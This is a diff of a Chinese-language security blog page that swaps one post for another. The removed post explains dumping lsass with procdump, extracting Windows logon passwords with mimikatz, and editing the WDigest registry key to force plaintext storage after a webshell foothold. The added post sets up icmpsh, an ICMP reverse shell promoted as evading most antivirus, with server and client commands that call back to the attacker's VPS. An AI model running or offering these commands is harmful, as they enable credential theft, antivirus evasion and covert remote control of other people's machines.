@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>简单两步抓取Windwos明文密码 | Mari0er&#39;s Blog</title>
+<title>ICMP隧道工具---icmpsh | Mari0er&#39;s Blog</title>
 <meta name="description" content="">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -104,46 +104,72 @@
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">简单两步抓取Windwos明文密码</h2>
-            <div class="post-date">2019-08-28</div>
+            <h2 class="post-title">ICMP隧道工具---icmpsh</h2>
+            <div class="post-date">2020-05-09</div>
             
-              <div class="feature-container" style="background-image: url('https://raw.githubusercontent.com/mari0er/picture/master/0102/logo.jpg')">
+              <div class="feature-container" style="background-image: url('https://raw.githubusercontent.com/mari0er/picture/master/1313/1.jpg')">
               </div>
             
             <div class="post-content">
-              <p>  前几天渗透拿到了Webshell，在抓取管理员密码进行远程桌面时遇到了问题，这里记录一下。</p>
-<!--more-->
-<p>  本来想着直接上传mimikzta进行抓取，但是目标机器安装了360导致mimikzta直接被杀，问了一下大佬，可以直接利用Procdump工具抓取lsass.dmp,再拉回本地利用mimikzta进行破解。Procdump工具点击<a href="https://1drv.ms/u/s!Avl1qZqVOurQgiGzbY8yPdDWXfRj?e=k7DscL">这里</a>直接下载。</p>
-<h3 id="0x01">0x01</h3>
-<p>  说干就干，首先上传程序至服务器，然后直接执行如下命令即可</p>
-<pre><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0102/procdump1.png" alt="procdump" loading="lazy"></figure>
-<h3 id="0x02">0x02</h3>
-<p>  直接将lsass.dmp拖回本地利用mimikzta进行破解，(此时得用管理员权限运行)，有了密码直接远程登录搞定。</p>
-<pre><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/mari0er/picture/master/0102/pass1.jpg" alt="pass" loading="lazy"></figure>
-<h3 id="0x03">0x03</h3>
-<p>  若遇到破解出来密码为null的情况，可以先修改注册表让其以明文保存密码，然后需要想办法让管理员重新以密码登录，建议锁屏</p>
-<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
-</code></pre>
+              <p>  最近了解到一个通过ICMP协议反弹shell 的工具，运行不需要管理员权限也可以绕过大部分杀软，比较好用这里记录一下备忘。</p>
+<!-- more -->
+<h3 id="0x01-软件介绍">0x01 软件介绍</h3>
+<p>点击<a href="https://github.com/inquisb/icmpsh">这里</a>直接下载,下载后可以看到有如下文件。<br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/1313/icmpsh.png" alt="icmpsh" loading="lazy"></p>
+<p>和NC类似，该软件也分为客户端和服务端，这里详细解释一下各个文件的作用<br>
+<strong>客户端：运行在目标终端(只有Windwos版本)</strong><br>
+<strong>服务端：运行在用于回弹Shell的服务器，一般是自己的VPS服务器</strong></p>
 <blockquote>
-<p>本文作者： Mari0er<br>
-本文链接： https://mari0er.club/post/procdump.html<br>
-版权声明： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">BY-NC-SA</a> 许可协议。转载请注明出处！！</p>
+<p>icmpsh.exe              Windows客户端<br>
+icmpsh_m.py          Python版本的服务端<br>
+icmpsh-m.c            C语言版的的服务端（需要进行编译）<br>
+icmpsh-m.pl           Perl版本的服务端<br>
+icmpsh-s.c              C语言版本的客户端（需要进行编译）<br>
+run.sh                       服务端主程序</p>
 </blockquote>
+<h3 id="0x02-服务端">0x02 服务端</h3>
+<p>运行前首先执行如下两条命令，第一条安装协议，第二条便于在VPS查看回显</p>
+<pre><code>apt-get install python-impacket
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+</code></pre>
+<h5 id="1运行runsh">1.运行run.sh</h5>
+<p>直接运行后会提示输入目标主机的公网IP，接着在目标端直接执行给出的命令就可以回弹<br>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/1313/server-1.png" alt="server" loading="lazy"></p>
+<h5 id="2运行python版">2.运行Python版</h5>
+<p>运行Python版需要提供两个IP参数</p>
+<pre><code>python icmpsh_m.py + VPSIP + 目标公网IP 
+</code></pre>
+<h5 id="3运行c语言版本">3.运行C语言版本</h5>
+<p>这个和Python语法一样，不过首先要先进行编译</p>
+<pre><code>gcc imcpsh-m.c -o icmpsh
+./icmpsh + VPSIP + 目标公网IP
+</code></pre>
+<h3 id="0x03-客户端">0x03 客户端</h3>
+<p>客户端命令很简单，<strong>这里强调一下，用gcc编译的客户端可以绕过杀软但是默认的不行</strong></p>
+<pre><code>icmpsh.exe -t + VPSIP
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/mari0er/picture/master/1313/gcc.png" alt="gcc" loading="lazy"></figure>
+<h3 id="0x04-利用vps获取目标公网地址">0x04 利用VPS获取目标公网地址</h3>
+<p>在VPS端监听，在目标机上pingVPS机器，就可以在VPS上看到目标公网IP<br>
+<strong>VPS端：</strong></p>
+<pre><code>tcpdump -i eth0 icmp
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/mari0er/picture/master/1313/GETIP.png" alt="Get-ip" loading="lazy"></figure>
 
             </div>
             
               <div class="tag-container">
                 
-                  <a href="https://mari0er.github.io/tag/procdump/" class="tag">
-                    procdump
+                  <a href="https://mari0er.github.io/tag/icmp/" class="tag">
+                    icmp
                   </a>
                 
-                  <a href="https://mari0er.github.io/tag/mi-ma/" class="tag">
-                    密码
+                  <a href="https://mari0er.github.io/tag/icmpsh/" class="tag">
+                    icmpsh
+                  </a>
+                
+                  <a href="https://mari0er.github.io/tag/shell/" class="tag">
+                    shell
                   </a>
                 
               </div>
@@ -151,9 +177,9 @@
             
               <div class="next-post">
                 <div class="next">下一篇</div>
-                <a href="https://mari0er.github.io/post/kms.html/">
+                <a href="https://mari0er.github.io/post/ms17-010.html/">
                   <h3 class="post-title">
-                    自建KMS服务器
+                    MS17-010利用总结
                   </h3>
                 </a>
               </div>
